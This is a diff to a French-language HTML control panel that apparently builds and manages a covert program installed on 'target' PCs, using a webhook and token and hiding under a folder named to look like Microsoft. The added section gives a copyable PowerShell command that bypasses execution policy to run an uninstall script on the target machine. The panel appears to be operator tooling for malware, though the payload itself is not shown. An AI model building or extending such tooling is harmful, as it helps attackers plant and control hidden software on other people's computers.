@@ -354,6 +354,21 @@
 
 </div>
 
+<hr class="divider" />
+
+<!-- ── SECTION 3 : Desinstallation ──────────────────────────────────────── -->
+<p class="section-title">Desinstaller sur un PC cible</p>
+
+<div class="cmd-box" style="flex-direction:column;align-items:flex-start;gap:.75rem">
+  <div style="font-size:.8rem;color:var(--muted)">
+    A executer sur le PC de la cible dans un PowerShell ouvert normalement :
+  </div>
+  <div style="display:flex;align-items:center;gap:.75rem;width:100%">
+    <code id="uninstallCmd" style="flex:1;font-family:'Consolas',monospace;font-size:.8rem;color:#93c5fd;word-break:break-all">powershell -ep bypass -File "$env:LOCALAPPDATA\Microsoft\PyService\uninstall.ps1"</code>
+    <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem;flex-shrink:0" onclick="copyUninstall()">Copier</button>
+  </div>
+</div>
+
 <div id="toast"></div>
 
 <script>
@@ -364,6 +379,11 @@
     const token   = document.getElementById('genToken').value.trim();
     const btn     = document.getElementById('dlBtn');
     btn.disabled  = !(webhook && token);
+  }
+
+  function copyUninstall() {
+    const cmd = document.getElementById('uninstallCmd').textContent;
+    navigator.clipboard.writeText(cmd).then(() => toast('Commande copiee !'));
   }
 
   function downloadSetup() {
